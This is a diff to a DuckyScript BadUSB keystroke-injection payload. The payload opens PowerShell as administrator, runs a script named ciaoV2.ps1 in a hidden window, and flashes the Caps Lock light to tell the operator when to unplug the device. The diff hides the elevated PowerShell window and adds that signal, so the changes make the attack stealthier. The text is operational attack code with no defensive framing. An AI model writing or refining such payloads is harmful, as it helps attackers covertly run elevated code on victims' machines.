@@ -7,7 +7,7 @@ DELAY 500
 REM Start powershell as admin
 GUI r
 DELAY 500
-STRING powershell
+STRING powershell.exe -windowstyle hidden
 DELAY 200
 CTRL SHIFT ENTER
 DELAY 2000
@@ -31,4 +31,20 @@ DELAY 3500
 REM Start ps1 script
 STRING powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1
 ENTER
+REM Make capslock flash to know when you can unplug the BadUSB
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 2000
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
 REM End of payload
